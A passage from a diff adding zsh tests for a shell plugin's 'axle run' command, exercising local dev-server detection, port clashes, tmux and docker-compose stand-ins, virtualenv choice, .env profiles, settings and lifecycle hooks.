+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  web_project $port
+  _axle_run_start $T/web taken; wait_state taken up
+  # A stand-in for Flask (found before any installed one): run() serves on its port.
+  mkdir -p $T/selfy/flask
+  print -l 'from .app import Flask' > $T/selfy/flask/__init__.py
+  print -l 'import http.server' \
+    'class Flask:' \
+    '    def __init__(self, name): pass' \
+    '    def run(self, host="127.0.0.1", port=5000, debug=False):' \
+    '        print(f"Running on http://{host}:{port}", flush=True)' \
+    '        http.server.HTTPServer((host, port), http.server.SimpleHTTPRequestHandler).serve_forever()' \
+    > $T/selfy/flask/app.py
+  print -l 'from flask import Flask' 'app = Flask(__name__)' \
+    'if __name__ == "__main__":' "    app.run(host=\"127.0.0.1\", port=$port, debug=True)" > $T/selfy/app.py
+  : > $T/selfy/requirements.txt
+  local out
+  fake_terminal                    # (load the questions, then stand in for them)
+  axle_confirm() { print -r -- "ASKED $1"; return 0 }
+  axle_select() { REPLY=$2 }       # (the port clash: its default, the next port)
+  cd $T/selfy; out=$(axle run </dev/null 2>&1) || fail "it runs: $out"
+  assert_contains "$out" "Port $port is taken by your service taken" "the clash"
+  assert_match "$out" "*is taken*ASKED Run it?*" "said before the first-run question"
+  assert_contains "$out" "ASKED Run it?  python · Flask · ${py:t} app.py" "which asks about the file as it is"
+  assert_contains "$out" "AXLE_RUN_PORT=$(( port + 1 ))" "the next port"
+  assert_not_match "$out" "*PYTHONPATH*" "the hook isn't shown"
+  assert_not_match "$out" "*can't be given*" "nor a reason it can't"
+  wait_state selfy up
+  assert_eq "$(<$HOME/.local/state/axle/run/services/selfy/port)" $(( port + 1 )) "it serves there"
+  assert_contains "$(<$HOME/.local/state/axle/run/services/selfy/log)" "Running on http://127.0.0.1:$(( port + 1 ))" "its own run() was given it"
+  assert_eq "$(<$T/selfy/app.py | tail -1)" "    app.run(host=\"127.0.0.1\", port=$port, debug=True)" "the file is unchanged"
+  # On its own port next time it's the same command: not asked again.
+  axle run stop all >/dev/null
+  _axle_run_start $T/web taken; wait_state taken up   # (still taken: another clash)
+  out=$(axle run </dev/null 2>&1)
+  [[ $out == *ASKED* ]] && fail "trusted already, whichever port: $out"
+  axle run stop all >/dev/null
+}
+
+# In a terminal the busy port is a question: ↓ Enter picks "Stop one, then run here".
+test_run_port_question_in_a_terminal() {
+  zmodload zsh/zpty 2>/dev/null || return 0
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  mkdir -p $T/one $T/two
+  print '<!doctype html>' > $T/one/index.html; print '<!doctype html>' > $T/two/index.html
+  : > $T/one/requirements.txt; : > $T/two/requirements.txt
+  print -l "AXLE_MODULES=(run); source $ROOT/axle.plugin.zsh" \
+    "_axle_run_detect $T/one >/dev/null 2>&1" \
+    'functions[_axle_run_detect_orig]=$functions[_axle_run_detect]' \
+    "_axle_run_detect() { _axle_run_detect_orig \"\$@\" || return 1; _axle_run_cmd=(\$_axle_run_cmd[1] $ROOT/tests/serve.py $port); _axle_run_port=$port }" \
+    > $T/setup.zsh
+  zpty sh "HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME XDG_CACHE_HOME=$XDG_CACHE_HOME XDG_DATA_HOME=$XDG_DATA_HOME HISTFILE=$T/hist TERM=xterm AXLE_UPDATE_CHECK=0 zsh -f -i"
+  zpty -w sh "PS1='> '; source $T/setup.zsh; cd $T/one; axle run --yes; cd $T/two; : > $T/ready"
+  _wait() { local -i i; local c; for i in {1..150}; do while zpty -rt sh c 2>/dev/null; do :; done; [[ -e $1 ]] && return 0; sleep 0.1; done; fail "no answer ($1)" }
+  _wait $T/ready
+  wait_state one up
+  zpty -w sh "axle run --yes; : > $T/done"
+  sleep 1; zpty -n -w sh $'\e[B'; sleep 0.3; zpty -n -w sh $'\r'
+  _wait $T/done
+  wait_state two up
+  [[ -e $HOME/.local/state/axle/run/services/one ]] && fail "one was stopped"
+  assert_eq "$(<$HOME/.local/state/axle/run/services/two/port)" $port "two took its port"
+  zpty -w sh 'axle run stop all; exit'; sleep 0.5; zpty -d sh 2>/dev/null
+  return 0
+}
+
+# A server listening only on IPv6 (like Vite on ::1) counts as up.
+test_run_ipv6_only_server_is_up() {
+  AXLE_MODULES=(run) load_tool
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  local REPLY port; free_port; port=$REPLY
+  $py $ROOT/tests/serve.py $port ::1 >/dev/null 2>&1 &
+  local pid=$!
+  local -i i ok=0
+  for i in {1..50}; do _axle_run_port_up $port && { ok=1; break }; sleep 0.1; done
+  # (No IPv6 on this machine: python couldn't bind, nothing to check.)
+  if ! kill -0 $pid 2>/dev/null; then return 0; fi
+  kill $pid 2>/dev/null
+  (( ok )) || fail "an IPv6-only listener on $port is up"
+  local -i j; for j in {1..30}; do _axle_run_port_up $port || break; sleep 0.1; done
+  _axle_run_port_up $port && fail "and down once it's gone"
+  return 0
+}
+
+# --- M4: more projects ----------------------------------------------------------------
+
+test_run_detects_more_samples() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  local -a cases=(
+    "compose-app|docker compose -f compose.yaml up -d | compose | 8080 | docker compose (2 services)"
+    "procfile-web|sh -c 'python3 -m http.server \$PORT' | service | 5000 | Procfile"
+    "make-run|make run | task |  | make"
+    "just-dev|just dev | task |  | just"
+    "rust-lib|none"
+  )
+  local c
+  for c in $cases; do
+    assert_eq "$(detect ${c%%|*})" "${c#*|}" "sample ${c%%|*}"
+  done
+}
+
+test_run_finds_parts() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  local -a reply
+  _axle_run_parts $T/fx/monorepo
+  assert_eq "${(j: :)reply}" "api web" "a frontend and a backend (docs isn't a part)"
+  _axle_run_parts $T/fx/cargo-ws
+  assert_eq "${(j: :)reply}" "cli" "a Cargo workspace: the member with a binary"
+  _axle_run_parts $T/fx/compose-app
+  assert_eq "${(j: :)reply}" "." "compose runs the whole project"
+  local REPLY
+  _axle_run_partname $T/fx/monorepo web; assert_eq $REPLY monorepo-web "part names"
+}
+
+# A project of two static parts (on free ports) and one task part, for running.
+parts_project() {
+  local REPLY; free_port; typeset -g P1=$REPLY P2=$(( REPLY + 50 ))
+  mkdir -p $T/shop/{one,two,cli}
+  print '{"name": "shop", "workspaces": ["one", "two", "cli"]}' > $T/shop/package.json
+  print '<!doctype html>' > $T/shop/one/index.html; print '<!doctype html>' > $T/shop/two/index.html
+  print 'print("hello from cli", flush=True)' > $T/shop/cli/main.py; : > $T/shop/cli/requirements.txt
+  _axle_run_detect $T/shop >/dev/null 2>&1        # (load the real one)
+  functions[_axle_run_detect_orig]=$functions[_axle_run_detect]
+  _axle_run_detect() {
+    _axle_run_detect_orig "$@" || return 1
+    case $1 in
+      */one) _axle_run_cmd=($_axle_run_cmd[1] $ROOT/tests/serve.py $P1); _axle_run_port=$P1 ;;
+      */two) _axle_run_cmd=($_axle_run_cmd[1] $ROOT/tests/serve.py $P2); _axle_run_port=$P2 ;;
+    esac
+    return 0
+  }
+}
+
+test_run_parts_first_run_saves_the_choice() {
+  AXLE_MODULES=(run) load_tool
+  whence -p python3 >/dev/null || return 0
+  parts_project
+  rm -rf $T/shop/cli
+  cd $T/shop
+  local out
+  out=$(axle run --yes </dev/null 2>&1) || fail "starts: $out"
+  wait_state shop-one up; wait_state shop-two up
+  local -a reply; _axle_run_choice_load $T/shop
+  assert_eq "${(j: :)reply}" "one two" "no terminal to ask in: all, saved"
+  out=$(axle run -n 2>&1)
+  assert_contains "$out" "saved choice: one, two"
+  axle run stop >/dev/null
+  local -a left=($HOME/.local/state/axle/run/services/*(N))
+  (( ${#left} )) && fail "stop in the project stops all its parts: $left"
+  # A saved part that's gone: said, skipped, the rest runs.
+  _axle_run_choice_save $T/shop two gone
+  out=$(axle run --yes </dev/null 2>&1)
+  assert_contains "$out" "saved part gone has nothing to run any more: skipped"
+  wait_state shop-two up
+  [[ -e $HOME/.local/state/axle/run/services/shop-one ]] && fail "only the saved parts start"
+  axle run stop all >/dev/null
+  return 0
+}
+
+test_run_failing_part_shows_its_whole_log() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/app
+  print -l 'web: echo first line; seq 1 40; echo last line; exit 4' > $T/app/Procfile
+  cd $T/app
+  local out
+  local -i rc=0
+  out=$(axle run --yes </dev/null 2>&1) || rc=$?
+  assert_contains "$out" "exited (code 4)"
+  assert_contains "$out" "│ first line" "the whole log, from the first line"
+  assert_contains "$out" "│ 20" "the middle"
+  assert_contains "$out" "│ last line" "to the last"
+  [[ $out == *"didn't start"* ]] && fail "one part: its crash was just shown"
+  (( rc )) || fail "a part that fails: an error status"
+  return 0
+}
+
+test_run_verbose_without_tmux() {
+  AXLE_MODULES=(run) load_tool
+  whence -p python3 >/dev/null || return 0
+  parts_project
+  _axle_run_partname x y                          # (load parts.zsh, then replace its check)
+  _axle_run_have_tmux() { return 1 }
+  cd $T/shop
+  local out
+  out=$(axle run --yes --verbose 'shop-one, shop-two' </dev/null 2>&1) && fail "two verbose parts, no tmux"
+  assert_contains "$out" "too many to show verbosely in one shell (2)"
+  local -a left=($HOME/.local/state/axle/run/services/*(N))
+  (( ${#left} )) && fail "nothing started: $left"
+  # One verbose part: the others start in the background, then it runs here.
+  out=$(axle run --yes --verbose cli </dev/null 2>&1) || fail "runs: $out"
+  assert_contains "$out" "hello from cli" "the verbose part's output, in this shell"
+  wait_state shop-one up; wait_state shop-two up
+  axle run stop all >/dev/null
+  # --only: just that one.
+  out=$(axle run --yes --verbose cli --only </dev/null 2>&1)
+  assert_contains "$out" "hello from cli"
+  left=($HOME/.local/state/axle/run/services/*(N))
+  (( ${#left} )) && fail "--only starts nothing else: $left"
+  out=$(axle run --yes --verbose nope </dev/null 2>&1) && fail "an unknown part"
+  assert_contains "$out" "no part 'nope' in shop (parts: shop-cli, shop-one, shop-two)"
+  return 0
+}
+
+test_run_verbose_with_tmux() {
+  AXLE_MODULES=(run) load_tool
+  whence -p python3 >/dev/null || return 0
+  parts_project
+  # A stand-in tmux that records what it's asked.
+  mkdir -p $T/bin
+  print -l '#!/bin/sh' 'case $1 in has-session) exit 1 ;; esac' \
+    'printf "%s|" "$@" >> "$TMUX_LOG"; echo >> "$TMUX_LOG"' > $T/bin/tmux
+  chmod +x $T/bin/tmux
+  path=($T/bin $path); export TMUX_LOG=$T/tmux.log
+  cd $T/shop
+  local out
+  out=$(axle run --yes --verbose shop-one,shop-two --only </dev/null 2>&1) || fail "runs: $out"
+  assert_contains "$out" "tmux sessions: shop-one, shop-two"
+  local log=$(<$T/tmux.log)
+  assert_contains "$log" "new-session|-d|-s|shop-one|-c|$T/shop/one|-e|PORT=$P1|--|" "a session per part, in its folder, with its port"
+  assert_contains "$log" "|axle-run|python3|$ROOT/tests/serve.py|$P1|" "the command as words, kept open after it ends"
+  assert_contains "$log" "new-session|-d|-s|shop-two|" "the second"
+  local -a left=($HOME/.local/state/axle/run/services/*(N))
+  (( ${#left} )) && fail "--only: nothing in the background: $left"
+  return 0
+}
+
+test_run_config_asks_again() {
+  zmodload zsh/zpty 2>/dev/null || return 0
+  AXLE_MODULES=(run) load_tool
+  parts_project
+  _axle_run_choice_save $T/shop one two
+  print -l "AXLE_MODULES=(run); source $ROOT/axle.plugin.zsh" "cd $T/shop" \
+    "_axle_run_partname x y" "_axle_run_have_tmux() { return 1 }" > $T/setup.zsh
+  zpty sh "HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME XDG_CACHE_HOME=$XDG_CACHE_HOME XDG_DATA_HOME=$XDG_DATA_HOME HISTFILE=$T/hist TERM=xterm AXLE_UPDATE_CHECK=0 zsh -f -i"
+  zpty -w sh "PS1='> '; source $T/setup.zsh; : > $T/ready"
+  _wait() { local -i i; local c; for i in {1..150}; do while zpty -rt sh c 2>/dev/null; do :; done; [[ -e $1 ]] && return 0; sleep 0.1; done; fail "no answer ($1)" }
+  _wait $T/ready
+  # The list: shop-cli, shop-one, shop-two, with one and two ticked. Tick cli, untick one.
+  zpty -w sh "axle run --yes --config --only --verbose cli; : > $T/done"
+  sleep 1; zpty -n -w sh ' '; sleep 0.2; zpty -n -w sh $'\e[B'; sleep 0.2; zpty -n -w sh ' '; sleep 0.2
+  zpty -n -w sh $'\r'
+  _wait $T/done
+  zpty -w sh 'exit'; zpty -d sh 2>/dev/null
+  local -a reply; _axle_run_choice_load $T/shop
+  assert_eq "${(j: :)reply}" "cli two" "--config: chosen again, and saved"
+}
+
+# What you actually read: `axle run` waits for the server and says where it is, and `ls`
+# gives the uptime with its unit.
+test_run_says_when_the_server_is_up() {
+  AXLE_MODULES=(run) load_tool
+  whence -p python3 >/dev/null || return 0
+  local REPLY port; free_port; port=$REPLY
+  mkdir -p $T/site; print '<!doctype html>' > $T/site/index.html
+  _axle_run_detect $T/site >/dev/null 2>&1
+  functions[_axle_run_detect_orig]=$functions[_axle_run_detect]
+  _axle_run_detect() { _axle_run_detect_orig "$@" || return 1; _axle_run_cmd=($_axle_run_cmd[1] $ROOT/tests/serve.py $port); _axle_run_port=$port }
+  cd $T/site
+  local out=$(axle run --yes </dev/null 2>&1)
+  assert_contains "$out" "site" "names it"
+  assert_contains "$out" "running on http://localhost:$port" "and waits until it's up"
+  assert_match "$(axle run ls)" "*up*$port*[0-9]s *" "uptime with its unit"
+  axle run stop >/dev/null
+}
+
+# The real tmux, on the test's own server (TMUX_TMPDIR): the session runs the part in its
+# folder with its environment, and stays open with the output after the program ends.
+test_run_verbose_with_real_tmux() {
+  AXLE_MODULES=(run) load_tool
+  whence -p tmux >/dev/null || return 0
+  [[ $(command tmux -V) == (#b)*\ ([0-9]##).([0-9]##)* ]] && (( match[1] > 3 || (match[1] == 3 && match[2] >= 2) )) || return 0
+  mkdir -p $T/mono/a $T/mono/b
+  print '{"workspaces": ["a", "b"]}' > $T/mono/package.json
+  print -l 'web: echo "from a in $(basename "$PWD") GREET=$GREET"; exit 3' > $T/mono/a/Procfile
+  print 'GREET=hello' > $T/mono/a/.env
+  print -l 'web: exit 0' > $T/mono/b/Procfile
+  cd $T/mono
+  local out; local -i rc=0
+  out=$(axle run --yes --verbose mono-a --only </dev/null 2>&1) || rc=$?
+  (( rc == 0 )) || fail "started: $out"
+  assert_contains "$out" "tmux sessions: mono-a"
+  command tmux has-session -t '=mono-a' || fail "the session exists"
+  local -i i; local pane=''
+  for i in {1..50}; do
+    pane=$(command tmux capture-pane -p -t '=mono-a:')
+    [[ $pane == *"exited with code"* ]] && break
+    sleep 0.1
+  done
+  command tmux kill-server 2>/dev/null
+  assert_contains "$pane" "from a in a GREET=hello" "its folder and .env, still readable after it ended"
+  assert_contains "$pane" "exited with code 3" "and how it ended"
+}
+
+# In the foreground a project gets the same environment as in the background.
+test_run_foreground_gets_env_file_and_port() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/fg
+  print 'GREET=hello' > $T/fg/.env
+  print 'web: echo "GREET=$GREET PORT=$PORT"' > $T/fg/Procfile
+  cd $T/fg
+  local out=$(axle run --yes --fg </dev/null 2>&1)
+  assert_contains "$out" "GREET=hello PORT=" ".env in the foreground"
+  [[ $out == *"PORT=5"* ]] || [[ $out == *"PORT="[0-9]* ]] || fail "and its port: $out"
+}
+
+# --- with the real tools, and judged by what you read -----------------------------------
+
+# A real Node server, through detection, .env and the whole cycle. Skipped without node.
+test_run_real_node_server_full_cycle() {
+  AXLE_MODULES=(run) load_tool
+  whence -p node >/dev/null && whence -p npm >/dev/null || return 0
+  local REPLY port; free_port; port=$REPLY
+  mkdir -p $T/api; cd $T/api
+  print '{"name": "api", "scripts": {"start": "node server.js"}, "dependencies": {"express": "^4"}}' > package.json
+  print "PORT=$port" > .env
+  print -l 'const http = require("http"); const p = process.env.PORT;' \
+    'http.createServer((q, s) => s.end("hello")).listen(p, () => console.log("listening " + p));' > server.js
+  local out
+  out=$(axle run --yes </dev/null 2>&1) || fail "starts: $out"
+  assert_contains "$out" "running on http://localhost:$port" "says where it is"
+  out=$(axle run ls 2>&1); assert_match "$out" "*api*up*$port*http://localhost:$port*" "ls"
+  out=$(axle run </dev/null 2>&1); assert_contains "$out" "already running on http://localhost:$port" "a second run"
+  out=$(axle run logs 2>&1); assert_contains "$out" "listening $port" "its output"
+  out=$(axle run restart </dev/null 2>&1) || fail "restart: $out"
+  assert_contains "$out" "running on http://localhost:$port" "restart: the same command, the same port"
+  out=$(axle run stop 2>&1); assert_contains "$out" "stopped api"
+  _axle_run_port_up $port && fail "the port is free again"
+  assert_eq "$(axle run ls)" "nothing running" "nothing left"
+}
+
+# docker compose's whole cycle, with a stand-in docker that records what it's asked.
+test_run_compose_full_cycle() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  mkdir -p $T/bin
+  print -l '#!/bin/sh' 'echo "$*" >> "$DOCKER_LOG"' 'case "$*" in *logs*) echo "compose log line" ;; esac' > $T/bin/docker
+  chmod +x $T/bin/docker
+  path=($T/bin $path); export DOCKER_LOG=$T/docker.log
+  cd $T/fx/compose-app
+  local out
+  out=$(axle run --yes </dev/null 2>&1) || fail "up: $out"
+  local REPLY; nocolor "$out"; out=$REPLY
+  assert_contains "$out" "compose-app up (docker compose) on http://localhost:8080" "says it's up"
+  assert_contains "$(<$HOME/.cache/axle/drops/run-compose-app)" "text=compose-app :8080" "the tab"
+  out=$(axle run ls 2>&1); assert_match "$out" "*compose-app*compose*8080*" "ls"
+  out=$(axle run logs 2>&1); assert_contains "$out" "compose log line" "logs"
+  out=$(axle run restart 2>&1); assert_contains "$out" "restarted compose-app" "restart"
+  out=$(axle run stop 2>&1); assert_contains "$out" "stopped compose-app" "stop"
+  local log=$(<$DOCKER_LOG)
+  local f="compose -f compose.yaml"
+  assert_contains "$log" "$f up -d" "up"
+  assert_contains "$log" "$f logs --tail 200" "logs, in full"
+  assert_contains "$log" "$f restart" "restart, in full"
+  assert_contains "$log" "$f down" "down, in full"
+  assert_eq "$(axle run ls)" "nothing running" "nothing left"
+  [[ -e $HOME/.cache/axle/drops/run-compose-app ]] && fail "no tab left"
+  return 0
+}
+
+# --- detection and venvs, from a real project's layout (tests/fixtures/run/flask-main) ------
+
+# A fake venv: mkvenv <folder>
+mkvenv() { mkdir -p $1/bin; : > $1/pyvenv.cfg; print '#!/bin/sh\necho "python from $0"' > $1/bin/python; chmod +x $1/bin/python }
+
+test_run_app_that_starts_itself() {
+  AXLE_MODULES=(run) load_tool
+  fixtures
+  local -a reply; local REPLY
+  _axle_run_parts $T/fx/flask-main
+  assert_eq "$reply" "." "a package and an extension's import aren't parts"
+  _axle_run_detect $T/fx/flask-main
+  assert_eq "$_axle_run_reason" "app.py starts itself" "its main(), not flask run"
+  assert_eq "$_axle_run_portway" "env:PORT" "config.py reads PORT"
+  print 'PORT=5055' > $T/fx/flask-main/.env
+  _axle_run_detect $T/fx/flask-main; assert_eq "$_axle_run_port" 5055 "and .env sets it"
+  # Extensions and packages named after a framework aren't that framework.
+  mkdir -p $T/ext
+  print 'from flask_cors import CORS\nimport dash_bootstrap\nfrom fastapi_utils import x' > $T/ext/tools.py
+  _axle_run_detect $T/ext && fail "only extensions: $_axle_run_what"
+  print 'import flask.cli' > $T/ext/app.py
+  _axle_run_detect $T/ext; assert_eq "$_axle_run_what" "python · Flask" "flask.cli is flask"
+}
+
+test_venv_of_any_name() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/p/sub; : > $T/p/requirements.txt; print 'print(1)' > $T/p/main.py
+  mkvenv $T/p/.espresso
+  local REPLY
+  _axle_venv_in $T/p; assert_eq "$REPLY" "$T/p/.espresso" "any name, with pyvenv.cfg"
+  _axle_run_detect $T/p; _axle_run_show $T/p
+  assert_eq "$REPLY" ".espresso/bin/python main.py" "and it's what runs"
+  mkvenv $T/p/.venv
+  _axle_venv_in $T/p; assert_eq "$REPLY" "$T/p/.venv" "the usual name first"
+  # A part uses the project's venv when it has none of its own.
+  mkdir -p $T/m/api; mkvenv $T/m/.venv; print 'print(1)' > $T/m/api/main.py
+  _axle_run_detect $T/m/api; _axle_run_show $T/m/api
+  assert_eq "$REPLY" "$T/m/.venv/bin/python main.py" "a part: the venv above it"
+  mkdir -p $T/empty; _axle_venv_in $T/empty && fail "no venv here"
+  # A venv beside a project isn't its venv, or its parent folder's.
+  mkdir -p $T/shelf/tools-venv $T/shelf/proj; : > $T/shelf/tools-venv/pyvenv.cfg; : > $T/shelf/proj/requirements.txt
+  _axle_venv_find $T/shelf/proj && fail "the venv next door: $REPLY"
+  return 0
+}
+
+# When another venv is active: AXLE_RUN_VENV, and what actually runs.
+test_run_venv_conflict() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/p; print 'print(1)' > $T/p/main.py; mkvenv $T/p/.espresso; mkvenv $T/other
+  local out
+  cd $T/p
+  export VIRTUAL_ENV=$T/other; path=($T/other/bin $path)
+  out=$(axle run --yes </dev/null 2>&1)
+  assert_contains "$out" "python from $T/p/.espresso/bin/python" "no terminal: the project's"
+  assert_contains "$out" "not the active one" "and says so"
+  AXLE_RUN_VENV=active
+  out=$(axle run </dev/null 2>&1)
+  assert_contains "$out" "python from $T/other/bin/python" "AXLE_RUN_VENV=active"
+  AXLE_RUN_VENV=project
+  out=$(axle run </dev/null 2>&1)
+  assert_contains "$out" "python from $T/p/.espresso/bin/python" "AXLE_RUN_VENV=project"
+  [[ $out == *"not the active one"* ]] && fail "project: no note needed"
+  # No venv here: it says it's using the other project's.
+  unset AXLE_RUN_VENV
+  rm -rf $T/p/.espresso
+  out=$(axle run --yes </dev/null 2>&1)
+  assert_contains "$out" "has no venv: using the active one" "says whose it's using"
+  # A venv with no Python in it.
+  mkdir -p $T/broken/.venv; : > $T/broken/.venv/pyvenv.cfg; print 'print(1)' > $T/broken/main.py
+  cd $T/broken; unset VIRTUAL_ENV
+  out=$(axle run --yes </dev/null 2>&1)
+  assert_contains "$out" "has no working Python" "a broken venv is said"
+}
+
+# The question, in a terminal: n keeps the active venv.
+test_run_venv_question_in_a_terminal() {
+  zmodload zsh/zpty 2>/dev/null || return 0
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/p; print 'print(1)' > $T/p/main.py; mkvenv $T/p/.espresso; mkvenv $T/other
+  print -r -- 'echo "python from $0" >> '$T'/ran' >> $T/other/bin/python
+  print -r -- 'echo "python from $0" >> '$T'/ran' >> $T/p/.espresso/bin/python
+  print -l "AXLE_MODULES=(run); source $ROOT/axle.plugin.zsh" "export VIRTUAL_ENV=$T/other" "path=($T/other/bin \$path)" "cd $T/p" > $T/setup.zsh
+  zpty sh "HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME XDG_CACHE_HOME=$XDG_CACHE_HOME XDG_DATA_HOME=$XDG_DATA_HOME HISTFILE=$T/hist TERM=xterm AXLE_UPDATE_CHECK=0 zsh -f -i"
+  zpty -w sh "PS1='> '; source $T/setup.zsh; : > $T/ready"
+  _wait() { local -i i; local c; for i in {1..150}; do while zpty -rt sh c 2>/dev/null; do :; done; [[ -e $1 ]] && return 0; sleep 0.1; done; fail "no answer ($1)" }
+  _wait $T/ready
+  zpty -w sh "axle run; : > $T/d1"; sleep 1; zpty -n -w sh y; sleep 0.7; zpty -n -w sh n; _wait $T/d1
+  assert_contains "$(<$T/ran)" "$T/other/bin/python" "n: the active one"
+  zpty -w sh 'exit'; zpty -d sh 2>/dev/null
+  return 0
+}
+
+# --- M5: your settings ------------------------------------------------------------------
+
+# A small Python project whose main.py prints the given environment variables.
+env_project() {
+  mkdir -p $1; print '[project]' > $1/pyproject.toml
+  print "import os; print('|'.join(os.environ.get(k, '-') for k in ['GREET', 'OTHER']))" > $1/main.py
+}
+
+# Your command: runs without asking, survives a new shell, can be shown, refused when
+# wrong, removed; forget drops settings and approvals.
+test_run_set_and_forget() {
+  setopt localoptions extendedglob
+  AXLE_MODULES=(run) load_tool
+  whence -p python3 >/dev/null || return 0
+  env_project $T/proj
+  cd $T/proj
+  fake_terminal; axle_confirm() { print -r -- "ASKED $1"; return 0 }
+  local out REPLY
+  out=$(axle run set command python3 -c 'print("mine")' 2>&1)
+  assert_contains "$out" "proj: command = python3 -c 'print(\"mine\")'" "several words kept apart"
+  out=$(axle run </dev/null 2>&1)
+  assert_contains "$out" "mine" "your command runs"
+  [[ $out == *ASKED* ]] && fail "and isn't asked about: $out"
+  out=$(zsh -fc "HOME=$HOME XDG_STATE_HOME=$XDG_STATE_HOME AXLE_MODULES=(run); source $ROOT/axle.plugin.zsh; cd $T/proj; axle run --dry-run" 2>&1)
+  assert_contains "$out" "how    your command · axle run set command" "in a new shell too"
+  assert_contains "$out" "yours  command" "and says it's yours"
+  axle run set port 99999 2>/dev/null && fail "a port is 1-65535"
+  axle run set kind daemon 2>/dev/null && fail "a kind is service or task"
+  axle run set colour red 2>/dev/null && fail "no such setting"
+  axle run set kind task >/dev/null
+  out=$(axle run set); nocolor "$out"; out=$REPLY
+  assert_match "$out" "*command*print*kind*task*" "set alone shows them"
+  axle run set command >/dev/null
+  out=$(axle run </dev/null 2>&1)
+  assert_contains "$out" "ASKED Run it?" "back to the detected command, which asks"
+  assert_contains "$out" "-|-" "and runs it"
+  out=$(axle run forget)
+  assert_contains "$out" "forgot its settings, saved parts and approved commands"
+  out=$(axle run </dev/null 2>&1)
+  assert_contains "$out" "ASKED Run it?" "asked again after forget"
+  out=$(axle run set); out=${out//$'\e'\[[0-9;]#m/}
+  assert_contains "$out" "command   python3 main.py (detected)" "settings gone: what's detected again"
+}
+
+# A port of yours goes to the server the way a taken port's replacement would, and the
+# command stays the one you approved.
+test_run_set_port_is_given_to_the_server() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/site; print '<!doctype html>' > $T/site/index.html
+  cd $T/site
+  axle run set port 8123 >/dev/null
+  local out=$(axle run --dry-run)
+  assert_contains "$out" "run    python3 -I -m http.server 8123" "the command gets it"
+  assert_contains "$out" "service on http://localhost:8123"
+  _axle_run_detect $T/site; _axle_run_trust_key $T/site; local with=$REPLY
+  axle run set port >/dev/null
+  _axle_run_detect $T/site; _axle_run_trust_key $T/site
+  assert_eq "$REPLY" "$with" "one approval, whatever the port"
+}
+
+# --profile: .env.<name> over .env (or over your env-file), remembered; none drops it.
+test_run_profiles_and_env_file() {
+  AXLE_MODULES=(run) load_tool
+  whence -p python3 >/dev/null || return 0
+  env_project $T/proj
+  print -l GREET=base OTHER=1 > $T/proj/.env
+  print GREET=prod > $T/proj/.env.prod
+  print -l GREET=local OTHER=2 > $T/proj/.env.local
+  cd $T/proj
+  local out
+  out=$(axle run --yes --profile prod </dev/null 2>&1)
+  assert_contains "$out" "prod|1" "the profile over .env"
+  assert_contains "$out" "profile prod: .env.prod over .env" "said"
+  out=$(axle run --yes </dev/null 2>&1)
+  assert_contains "$out" "prod|1" "remembered"
+  assert_contains "$(axle run --dry-run)" "env    .env then .env.prod"
+  out=$(axle run --profile staging </dev/null 2>&1) && fail "a profile with no file"
+  assert_contains "$out" "no .env.staging in proj (there's .env.local, .env.prod)"
+  axle run set env-file .env.local >/dev/null
+  out=$(axle run --yes </dev/null 2>&1)
+  assert_contains "$out" "prod|2" "your env-file, then the profile over it"
+  out=$(axle run --yes --profile none </dev/null 2>&1)
+  assert_contains "$out" "local|2" "none: just the env-file"
+  out=$(axle run --yes </dev/null 2>&1)
+  assert_contains "$out" "local|2" "and that's remembered too"
+}
+
+# Hooks fire once each, in this shell: start, ready, stop for a service; crash for one
+# that fails; a task's start and crash.
+test_run_hooks_fire_once() {
+  AXLE_MODULES=(run) load_tool
+  whence -p python3 >/dev/null || return 0
+  local REPLY port; free_port; port=$REPLY
+  mkdir -p $T/site; print '<!doctype html>' > $T/site/index.html
+  _h() { print -r -- "$*" >> $T/hooks }
+  h_start() { _h start "$@" }; h_ready() { _h ready "$@" }; h_crash() { _h crash "$@" }; h_stop() { _h stop "$@" }
+  axle hook run-start h_start; axle hook run-ready h_ready; axle hook run-crash h_crash; axle hook run-stop h_stop
+  cd $T/site
+  axle run set command python3 $ROOT/tests/serve.py $port >/dev/null
+  axle run set kind service >/dev/null; axle run set port $port >/dev/null
+  axle run --yes >/dev/null 2>&1
+  local -i i
+  for i in {1..100}; do _axle_run_watch_check; [[ -r $T/hooks && $(<$T/hooks) == *ready* ]] && break; sleep 0.1; done
+  _axle_run_watch_check; _axle_run_watch_check                  # (more prompts)
+  axle run stop >/dev/null
+  _axle_run_watch_check
+  assert_eq "$(<$T/hooks)" "start site $T/site service
+ready site http://localhost:$port $port
+stop site" "each once, in order"
+  : > $T/hooks
+  axle run set command sh -c 'exit 3' >/dev/null; axle run set port >/dev/null
+  axle run --yes >/dev/null 2>&1
+  for i in {1..50}; do _axle_run_watch_check; [[ $(<$T/hooks) == *crash* ]] && break; sleep 0.1; done
+  _axle_run_watch_check
+  assert_eq "$(<$T/hooks)" "start site $T/site service
+crash site 3" "a crash, once"
+  axle run stop >/dev/null 2>&1
+  : > $T/hooks
+  axle run set kind task >/dev/null
+  axle run --yes >/dev/null 2>&1
+  assert_eq "$(<$T/hooks)" "start site $T/site task
+crash site 3" "a task's"
+}
+
+# AXLE_RUN_ON_EXIT=stop: a service ends with the terminal that started it.
+test_run_on_exit_stop() {
+  zmodload zsh/zpty 2>/dev/null || return 0
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  web_project $port || return 0
+  print -l "AXLE_MODULES=(run); AXLE_RUN_ON_EXIT=stop; source $ROOT/axle.plugin.zsh" \
+    "typeset -ga _axle_run_cmd=($_axle_run_cmd); typeset -g _axle_run_kind=service _axle_run_port=$port" \
